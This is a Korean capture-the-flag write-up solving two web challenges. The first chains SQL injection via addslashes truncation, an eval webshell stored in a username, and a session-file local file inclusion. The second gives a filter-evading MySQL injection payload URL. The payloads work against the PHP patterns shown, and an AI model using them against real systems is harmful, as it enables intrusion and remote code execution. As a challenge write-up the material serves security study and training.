# H3X0R CTF 2018
## goodaegi board (490pts) - solver (1)

구대기 보드는 SQL Injection과 LFI, PHP 세션을 이용해 RCE하는 문제다.

의도한 풀이의 전체적인 흐름은 SQL Injection으로 PHP 코드를 username에 넣어주고 해당 계정으로 로그인해서

LFI로 계정의 세션을 포함시켜 RCE로 flag.php 읽어오는걸 의도했다. (Session to RCE)


#### PHP Session to RCE

PHP에서 로그인을 구현할 때 로그인에 성공했다면 보통 아래와 같이 처리한다.

```php
<?php
session_start();
... (생략)
if(isset($fetch['username'])) { // 유저가 존재한다면
	$_SESSION['username'] = $fetch['username']; // 세션 할당
}
```

만약 여기서 ``$fetch['username']`` 변수에 ``<?php phpinfo(); ?>`` 가 들어가면 어떻게 될까?

세션 파일에 들어가는 내용이 ``username|s:19:"<?php phpinfo(); ?>";`` 이렇게 될 것이다.

우분투 기준 PHP 세션은 기본적으로 ``/var/lib/php/sessions/`` 에 저장되며 어느 계정이든 접근이 가능하다.

또한 저장되는 세션 파일명도 알아낼 수 있기 때문에 PHP코드가 포함된 세션을 inclusion 한다면 RCE가 가능하다.

세션 파일명 : ``sess_[random_string]`` 여기서 random_string은 클라이언트가 가지고 있는 PHPSESSID 값이다.

ex) PHPSESSID=fqs54b8ies3uhuhlttlb3lq3d0; => sess_fqs54b8ies3uhuhlttlb3lq3d0


단, 회원 가입에서 ``<, >`` 를 막아놨기 때문에 SQL Injection을 활용해야 한다.

#### SQL Injection

``classes/user.class.php`` 에 있는 user_join 함수에서 SQL Injection이 발생한다.

```php
public function user_join($user) {
	$user = array_map('addslashes', $user); // anti sql injection
	$nickname = substr($user['nickname'], 0, 100); // anti sql truncate attack
	$username = substr($user['username'], 0, 100); // anti sql truncate attack
	$password = sha1(md5($user['password']));

	if($message = $this->check_names($nickname, $username)) { // call name check function
		return $message;
	}

	$query = "insert into users values ('{$nickname}', '{$username}', '{$password}');";
	$this->query($query) or die($query);

	return false;
}
```

위 소스의 2 번째 줄부터 4 번째 줄을 확인하면 addslashes를 거치고 substr로 문자열을 자르고 있다.

addslashes를 거치기 때문에 이 코드가 안전하다고 생각할 수 있겠지만 아래와 같이 공격이 가능하다.

```
nickname : aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\
username : ,1,1)#
```

이유는 'a' * 99 뒤에 single quote(')가 붙었을 때 addslashes를 거치면서 앞에 backslashes(\)가 붙고

'a' * 99 + backslashes + single quote가 되면서 '가 잘리게 된다.

즉 아래와 같은 꼴이 된다.

``insert into users values ('aaaaaaaa\', '<inject point>', '<hash>');``

이제 여기서 username에 PHP 코드를 넣어주고 가입하면 된다

```
nickname : aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\
username : ,1,1),(1,0x3c3f206576616c28245f4745545b785d293b3f3e,sha1(md5(0x61)))#
```
> Login
username : ``<? eval($_GET[x]);?>``
password : ``a``

#### LFI to RCE
이제 세션에 PHP 코드를 넣는데 성공했다.

LFI는 ``?p=home.html`` 여기 p 파라미터에서 발생하는데 p 파라미터는 ``secure_page`` 함수를 거친다.

해당 함수는 ``config/function.php`` 에서 확인할 수 있다.

```php
function secure_page($page) { // anti hack
	$page = strtolower(trim($page)); // str to lowercase and remove whitespace
	$page = str_replace(chr(0), '', $page); // remove null byte
	$page = str_replace('../', '', $page); // remove '../'
	if(substr($page, -4, 4) == 'html') { // check extension
		return $page;
	} 
	die('403 forbidden.');
}
```
우선 4 번째 줄을 보면 ``../`` 를 없애고 있다, ``..././`` 이렇게 바꿔주면 가운데 ``../``가 없어지면서 ``../`` 가 된다.

그 다음, 세션은 사용자가 이름을 임의로 바꿀 수 있기 때문에 세션의 맨 뒷자리 4자를 ``html``로 바꾸면 된다.

ex) ``PHPSESSID=fqs54b8ies3uhuhlttlb3lq3d0html``

``?p=..././..././..././..././..././var/lib/php/sessions/fqs54b8ies3uhuhlttlb3lq3d0html``

RCE가 성공적으로 되는걸 확인했다면, flag.php를 읽으면 된다.

## sqlgame revenge (480pts) - solver (2)

MySQL Injection 문제다.

```php
<?php
error_reporting(0);
require_once 'config.php';

/*************************

 made by munsiwoo
 sqlgame-revenge

 sqlgame_revenge table structure :
 create table sqlgame_revenge (
	 username varchar(100),
	 password varchar(100)
 ) default charset=utf8;

**************************/

isset($_GET['username'], $_GET['password']) or view_source();

$conn = mysqli_connect('', __USER__, __PASS__, 'hahahoho');
$conn or die('sql server down.');

$username = substr($_GET['username'], 0, 400);
$password = substr($_GET['password'], 0, 400);

$filter  = "'|\"|x|b|y|substr|left|right|char|hex|md|sha|compress|mysql|blog";
$filter .= "|=|like|regexp|if|case|sleep|benchmark|munsiwoo|user|where|strcmp";
$filter .= "|column|table|load|file|view|sys|global|rand|innodb|space|mid|name";

(!preg_match("/{$filter}/is", $username.chr(32).$password)) or die('403 forbidden.');
(!preg_match("/password/i", $username)) or die('403 forbidden.');
(!(substr_count($username.$password, '(') > 25)) or die('403 forbidden.');

$query = "select * from sqlgame_revenge where username='{$username}' and password='{$password}'";
$query = mysqli_query($conn, $query) or die('syntax error.');
$fetch = mysqli_fetch_assoc($query) or die('user not found.');
$fetch = array_map('strtolower', $fetch);

(strtolower($fetch['username']) == 'munsiwoo') or die('who are you?');
(strtolower($fetch['password']) ==  $password) or die('pw incorrect!');

show_flag();

```

payload
```
http://18.216.25.52/7b9b9b1e52a8f5fcff220094034b9390/?username=\&password=||0%20union%20select%20concat(insert(encode(950358551,464374247),1,6,lpad(0,0,0)),insert(insert(encode(1366430893,867605427),1,4,lpad(0,0,0)),3,6,lpad(0,0,0)),insert(insert(insert(encode(546815368,1734964794),1,4,lpad(0,0,0)),1,1,lpad(0,0,0)),4,1,lpad(0,0,0))),(select%20insert(insert(info,1,63,lpad(0,0,0)),367,1,lpad(0,0,0))%20from%20information_schema.processlist%20limit%200,1)%23
```